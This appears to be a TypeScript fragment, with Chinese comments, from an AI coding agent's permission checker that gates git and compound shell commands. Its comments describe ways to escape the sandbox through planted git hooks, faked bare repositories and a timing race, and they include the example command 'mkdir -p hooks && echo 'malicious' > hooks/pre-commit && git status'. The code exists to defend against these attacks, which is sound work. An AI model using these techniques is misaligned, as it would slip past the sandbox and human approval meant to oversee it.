  // 这样可以防止通过 `cd /malicious/dir && git status` 实现沙箱逃逸，
  // 因为恶意目录中可能包含会执行任意代码的伪造 git hook。
  if (compoundCommandHasCd && hasGitCommand) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands with cd and git require permission checks for enhanced security',
    }
  }

  // 安全性：如果当前目录看起来像一个 bare/被利用过的 git repo，就拦截 git 命令。
  // 这样可以防止下列沙箱逃逸：
  // 1. 攻击者删除 .git/HEAD，使正常的 git 目录失效
  // 2. 然后在当前目录里创建 hooks/pre-commit 等 git 内部文件
  // 此时 git 会把 cwd 当成 git 目录本身，并执行其中的恶意 hook。
  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands in directories with bare repository structure require permission checks for enhanced security',
    }
  }

  // 安全性：拦截那些“既向 git 内部路径写入，又执行 git”的复合命令。
  // 这样可以防止某条命令先创建 git 内部文件
  // （HEAD、objects/、refs/、hooks/），再运行 git，
  // 从而执行这些新建文件里的恶意 hook。
  // 攻击示例：mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
  if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands that create git internal files and run git require permission checks for enhanced security',
    }
  }

  // 安全性：只有在原始 cwd 中，才允许把 git 命令自动判定为只读；
  // 原始 cwd 会受到 sandbox denyWrite 保护。若 sandbox 已关闭，则这一攻击路径本身失去意义。
  // 这里还要考虑竞态：沙箱中的某条命令可能先在子目录里创建 bare repo 文件，
  // 而后台执行的 git 命令（例如 sleep 10 && git status）
  // 会在这些文件真正出现之前就通过 isCurrentDirectoryBareGitRepo() 的检查。
  if (
    hasGitCommand &&
    SandboxManager.isSandboxingEnabled() &&
    getCwd() !== getOriginalCwd()
  ) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands outside the original working directory require permission checks when sandbox is enabled',
    }
  }

  // 检查是否所有子命令都属于只读。
  const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
    subcmd => {
      if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
        return false
      }
      return isCommandReadOnly(subcmd)
    },
  )

  if (allSubcommandsReadOnly) {
    return {
      behavior: 'allow',
      updatedInput: input,
    }
  }

  // 如果并非只读，则返回 passthrough，交给后续权限检查继续处理。
  return {
    behavior: 'passthrough',
    message: 'Command is not read-only, requires further permission checks',
  }
}
